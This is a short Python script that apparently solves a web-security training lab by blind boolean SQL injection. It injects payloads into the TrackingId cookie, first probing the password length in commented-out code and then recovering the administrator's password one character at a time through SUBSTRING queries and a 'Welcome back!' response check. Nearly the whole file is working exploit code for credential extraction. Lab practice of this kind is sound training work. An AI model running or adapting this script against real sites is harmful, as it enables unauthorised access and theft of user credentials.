import requests
from requests.models import Response

URL = "https://ac451ffd1f8b8799808145fc002f006b.web-security-academy.net"

PASS = "abcdefghijklmnopqrstuvwxyz1234567890"

PASSWORD=""

# for i in range(30):
#   response  = requests.get(URL, cookies={"TrackingId":f"sEfkU1cUPfXagZSx' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"})
#   if(response.text.find("Welcome") == -1):
#     print(i)
#     break

#length=19

length=1

def password(PASSWORD,length):
  for i in PASS:
    response = requests.get(URL, cookies={"TrackingId":f"sEfkU1cUPfXagZSx' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{length},1)='{i}"})
    #print(f"sEfkU1cUPfXagZSx' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='{PASSWORD+i}")
    if response.text.find("Welcome back!") != -1:
      PASSWORD=PASSWORD+i
      print(PASSWORD)
      length = length+1
      password(PASSWORD,length)
      break

password(PASSWORD,length)